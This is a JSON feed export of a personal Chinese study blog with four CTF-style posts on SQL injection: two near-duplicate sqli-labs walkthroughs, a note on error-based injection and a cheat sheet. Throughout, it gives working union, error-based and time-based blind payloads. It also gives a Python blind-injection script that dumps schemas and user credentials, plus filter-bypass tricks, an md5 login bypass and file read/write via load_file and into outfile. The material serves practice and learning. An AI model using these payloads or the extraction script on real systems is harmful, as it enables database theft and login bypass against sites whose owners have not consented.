{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"sql注入\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/ca25cf0b/",
            "url": "http://dpm12345.cn/posts/ca25cf0b/",
            "title": "sqli-labs练习",
            "date_published": "2022-09-22T18:48:08.000Z",
            "content_html": "<h1 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less 1\"></a>less 1</h1><p>输入<code>id</code>值，测试为字符型注入(此处注释符不能用<code>#</code>，可用<code>--+</code>)</p>\n<p>然后使用<code>order by x</code>，确认列数，为3列</p>\n<p>然后传入</p>\n<p><code>-1' union select 1,2,3--+</code></p>\n<p>确定输入位置，分别为2和3</p>\n<p>之后正常爆库、表、列</p>\n<h1 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less 2\"></a>less 2</h1><p>输入<code>id</code>，测试为整型注入，之后操作同less 1</p>\n<h1 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less 3\"></a>less 3</h1><p>输入<code>id</code>，纯数字，无报错，加上一个单引号，报错</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'') LIMIT 0,1' at </code></p>\n<p><code>line 1</code></p>\n<p>可判断为字符型注入，且有括号，之后操作如前</p>\n<h1 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less 4\"></a>less 4</h1><p>此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可</p>\n<h1 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less 5\"></a>less 5</h1><p>此题输入<code>id=1</code>，发现返回的是<code>You are in...</code></p>\n<p>可以推断这题使用bool盲注，<code>substr</code>，<code>length()</code>,<code>left</code>之类的函数使用，或者可以用时间盲注</p>\n<p><code>ascii 可以换 </code>ord`</p>\n<pre><code class=\"python\">'''\nAuthor       : zhong\nsince        : 2022-08-20 16:05:07\nLastAuthor   : zhong\nlastTime     : 2022-08-20 16:31:08\nblog         : http://dpm12345.cn/\nemail        : 1006975692@qq.com\n'''\nimport requests\nurl = \"http://192.168.47.132:5000/sqli-labs/Less-5/?id=1' and ascii(substr({},{},1))={}--+\"\ntarget = \"\"\nresult = \"#\"\ni = 0\nwhile True:\n    i += 1\ntarget = \"(select group_concat(schema_name)from information_schema.schemata)\"\n    # information_schema,challenges,mysql,performance_schema,security,test\n    # target = \"database()\"\n    # security\n    # target = \"(select group_concat(table_name)from information_schema.tables where table_schema='security')\"\n    # emails,referers,uagents,users\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')\"\n    # #id,username,password\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='uagents')\"\n    # #id,uagent,ip_address,username\n    # target = \"(select group_concat(id,0x7e,username,0x7e,password)from security.users)\"\n    # #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4\n    target = \"(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)\"\n    if i &gt; len(result):\n        break\n    for j in range(33, 128):\n        str = chr(j)\n        print(str)\n        res = requests.get(url.format(target, i, j))\n        if \"You are in\" in res.text:\n            result += str\n            print(result)\n            break\nprint(result)\n\n# security\n# emails,referers,uagents,users\n</code></pre>\n<h1 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less 6\"></a>less 6</h1><p>与less5相比，单引号改为双引号</p>\n<h1 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h1><p>相比上一个，其sql语句应为<code>where id = (('$id'))</code>，故闭合一个单引号和两个括号，之后和前面脚本一样</p>\n<h1 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less 8\"></a>less 8</h1><p>同less5</p>\n<h1 id=\"less-9\"><a href=\"#less-9\" class=\"headerlink\" title=\"less 9\"></a>less 9</h1><p>不管什么都显示相同，故采用时间盲注</p>\n<p>payload：<code>?id=1' and if(ascii(substr({},{},1))={},sleep(1),2)--+</code></p>\n<h1 id=\"less-10\"><a href=\"#less-10\" class=\"headerlink\" title=\"less 10\"></a>less 10</h1><p>第九题改单引号为双引号</p>\n<h1 id=\"less-11\"><a href=\"#less-11\" class=\"headerlink\" title=\"less 11\"></a>less 11</h1><p>联合查询</p>\n<p>payload</p>\n<pre><code class=\"sql\">passwd=admin&amp;uname=' union select 1,database()--+\npasswd=admin&amp;uname=' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security')--+\n或者使用报错注入\n\npasswd=1&amp;uname=1' and updatexml(0x7e,concat(0x7e,database()),0x7e)--+\n或者\npasswd=1&amp;uname=1'union (select 1,2 from(select count(*),concat((select (select (select concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23\n</code></pre>\n<h1 id=\"less-12\"><a href=\"#less-12\" class=\"headerlink\" title=\"less 12\"></a>less 12</h1><p>与 11 相比，闭合使用<code>\")</code></p>\n<p>其他同</p>\n<h1 id=\"less-13\"><a href=\"#less-13\" class=\"headerlink\" title=\"less 13\"></a>less 13</h1><p>闭合使用<code>')</code>，使用报错注入，其他无显示</p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/29fef1ad/",
            "url": "http://dpm12345.cn/posts/29fef1ad/",
            "title": "sqli-labs 练习",
            "date_published": "2022-09-22T16:07:26.000Z",
            "content_html": "<h1 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less 1\"></a>less 1</h1><p>输入 id 值，测试为字符型注入 (此处注释符不能用 <code>#</code> ，可用 <code>--+</code> ) </p>\n<p>然后使用 <code>order by x</code>，确认列数，为 <code>3</code> 列 然后传入</p>\n<pre><code class=\"raw\">-1' union select 1,2,3--+\n</code></pre>\n<p>确定输入位置，分别为 2 和 3</p>\n<p>之后正常爆库、表、列</p>\n<h1 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less 2\"></a>less 2</h1><p>输入 id，测试为整型注入，之后操作同 less 1</p>\n<h1 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less 3\"></a>less 3</h1><p>输入 id，纯数字，无报错，加上一个单引号，报错</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'') LIMIT 0,1' at line 1</code></p>\n<p>可判断为字符型注入，且有括号，之后操作如前</p>\n<h1 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less 4\"></a>less 4</h1><p>此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可</p>\n<h1 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less 5\"></a>less 5</h1><p>此题输入 id=1，发现返回的是 You are in… </p>\n<p>可以推断这题使用 bool 盲注，substr，length (),left 之类的函数使用，或者可以用时间盲注 </p>\n<p>ascii 可以换 ord</p>\n<pre><code class=\"python\">'''\nAuthor       : zhong\nsince        : 2022-08-20 16:05:07\nLastAuthor   : zhong\nlastTime     : 2022-08-20 16:31:08\nblog         : http://dpm12345.cn/\nemail        : 1006975692@qq.com\n'''\nimport requests\n\nurl = \"http://192.168.47.132:5000/sqli-labs/Less-5/?id=1' and ascii(substr({},{},1))={}--+\"\n\ntarget = \"\"\nresult = \"#\"\ni = 0\nwhile True:\n    i += 1\n    # target = \"(select group_concat(schema_name)from information_schema.schemata)\"\n    # information_schema,challenges,mysql,performance_schema,security,test\n    # target = \"database()\"\n    # security\n    # target = \"(select group_concat(table_name)from information_schema.tables where table_schema='security')\"\n    # emails,referers,uagents,users\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')\"\n    # #id,username,password\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='uagents')\"\n    # #id,uagent,ip_address,username\n    # target = \"(select group_concat(id,0x7e,username,0x7e,password)from security.users)\"\n    # #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4\n    target = \"(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)\"\n    if i &gt; len(result):\n        break\n    for j in range(33, 128):\n        str = chr(j)\n        print(str)\n        res = requests.get(url.format(target, i, j))\n        if \"You are in\" in res.text:\n            result += str\n            print(result)\n            break\nprint(result)\n\n# security\n# emails,referers,uagents,users\n</code></pre>\n<h1 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less 6\"></a>less 6</h1><p>与 less5 相比，单引号改为双引号</p>\n<h1 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h1><p>相比上一个，起 sql 语句应为 <code>where id = (('$id'))</code> ，故闭合一个单引号和两个括号，之后和前面脚本一样</p>\n<h1 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less 8\"></a>less 8</h1><p>同 less 5</p>\n<h1 id=\"less-9\"><a href=\"#less-9\" class=\"headerlink\" title=\"less 9\"></a>less 9</h1><p>不管什么都显示相同，故采用时间盲注 </p>\n<p>payload：<code>?id=1' and if(ascii(substr({},{},1))={},sleep(1),2)--+</code></p>\n<h1 id=\"less-10\"><a href=\"#less-10\" class=\"headerlink\" title=\"less 10\"></a>less 10</h1><p>第九题改单引号为双引号</p>\n<h1 id=\"less-11\"><a href=\"#less-11\" class=\"headerlink\" title=\"less 11\"></a>less 11</h1><p>联合查询</p>\n<p>payload</p>\n<pre><code class=\"sql\">passwd=admin&amp;uname=' union select 1,database()--+\npasswd=admin&amp;uname=' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security')--+\n</code></pre>\n<p>或者使用报错注入</p>\n<pre><code class=\"sql\">passwd=1&amp;uname=1' and updatexml(0x7e,concat(0x7e,database()),0x7e)--+\n或者\npasswd=1&amp;uname=1'union (select 1,2 from(select count(*),concat((select (select (select concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23\n</code></pre>\n<h1 id=\"less-12\"><a href=\"#less-12\" class=\"headerlink\" title=\"less 12\"></a>less 12</h1><p>与 11 相比，闭合使用 <code>\")</code></p>\n<p>其他同</p>\n<h1 id=\"less-13\"><a href=\"#less-13\" class=\"headerlink\" title=\"less 13\"></a>less 13</h1><p>闭合使用 <code>')</code> ，使用报错注入，其他无显示</p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e73517db/",
            "url": "http://dpm12345.cn/posts/e73517db/",
            "title": "SQL注入",
            "date_published": "2022-08-28T05:01:48.000Z",
            "content_html": "<h1 id=\"联合查询\"><a href=\"#联合查询\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h1><h1 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h1><h2 id=\"updatexml\"><a href=\"#updatexml\" class=\"headerlink\" title=\"updatexml\"></a>updatexml</h2><p>example：<code>?id=1'+updatexml(1,concat(0x7e,(select version())),0x7e)%23</code></p>\n<h2 id=\"floor\"><a href=\"#floor\" class=\"headerlink\" title=\"floor\"></a>floor</h2><p><code>floor</code>报错的原理是<code>rand</code>和<code>order by</code>或<code>group by</code>的冲突</p>\n<p>example：</p>\n<ul>\n<li><p>爆破数据库版本信息</p>\n<p><code>?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></p>\n</li>\n<li><p>爆破数据库名信息</p>\n<p><code>?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></p>\n</li>\n</ul>\n<p>分解解释</p>\n<p>分别将各语句分开，最终得到<code>select 1 from a</code>;</p>\n<p>而为了让<code>floor</code>中的<code>rand</code>和<code>order by</code>或<code>group by</code>进行冲突，必须存在<code>floor(rand (0)*2) x group by x</code></p>\n<p>编写步骤:</p>\n<p><code>select 1 from a</code></p>\n<p>丰富<code>a</code>的内容</p>\n<p><code>select 1 from (select count(*),xxx from information_schema.tables group by xxx)a</code></p>\n<p>替换上面的<code>xxx</code></p>\n<p><code>select 1 from (select count(*),concat(aaa,floor(rand(0)*2))xxx from information_schema.tables group by xxx)a</code></p>\n<p>最后替换<code>concat</code>中的<code>aaa</code>(即为需要获得的信息)</p>\n<p><code>select 1 from (select count(*),concat(concat(0x7e,database(),0x7e),floor(rand(0)*2))xxx from information_schema.tables group by xxx)a</code></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>example:<code>?id=1' and exp(~(select * from (select user())x))%23</code></p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/78c2084b/",
            "url": "http://dpm12345.cn/posts/78c2084b/",
            "title": "sql_sum",
            "date_published": "2022-06-06T12:01:48.000Z",
            "content_html": "<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><ul>\n<li>正常流程<ul>\n<li><code>select database();</code>   获取数据库名</li>\n<li><code>select group_concat(schema_name) from information_schema.schemata;</code> 获取所有的数据库名</li>\n<li><code>select group_concat(table_name) from information_schema.tables where table_schema = database();</code> 获取指定数据库中所有表名</li>\n<li><code>select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'xxx';</code> 获得指定表中的所有字段名</li>\n<li><code>select group_concat('xxx') from dataname.tablename;</code>  获得指定表中的指定字段的所有内容</li>\n</ul>\n</li>\n<li>匹配字符串<ul>\n<li><code>where xxx = 'xxx'</code></li>\n<li><code>having xxx = 'xxx'</code></li>\n<li><code>xxx regexp('xxx')</code> 利用正则匹配</li>\n<li><code>substr(str,start,len)</code> 获取str字符串从start开始(初始下标从1开始)的len个字符</li>\n<li><code>left(str,len)</code>、<code>right(str,len)</code> 从左/右开始数len个字符</li>\n</ul>\n</li>\n<li>假设有过滤<ul>\n<li>replace过滤为空: 由于该过滤只将匹配到的进行替换，故可通过双写绕过，如<code>seselectlect</code>过滤后得到<code>select</code></li>\n<li>过滤空格，绕过手段<code>(),%0a,%a0,%0c,%0d,反引号,/**/</code></li>\n<li>过滤<code>=</code>，可以使用<code>like</code>,<code>regexp</code>正则匹配</li>\n<li></li>\n</ul>\n</li>\n<li>特殊情况<ul>\n<li><code>select * from 'admin' where password=md5($pass,true)</code>此种情况为使用字符串<code>pass=ffifdyop</code>,sql接收后会将其hex解码，从而获得<code>' or '6xxxxx'</code>语句，得到一个永真式，绕过md5判断</li>\n</ul>\n</li>\n<li>文件操作<ul>\n<li><code>select load_file(xxx);</code> 读文件</li>\n<li><code>select xxx into outfile \"xxx\"</code> 写文件，前提是要有写文件权限</li>\n<li></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        }
    ]
}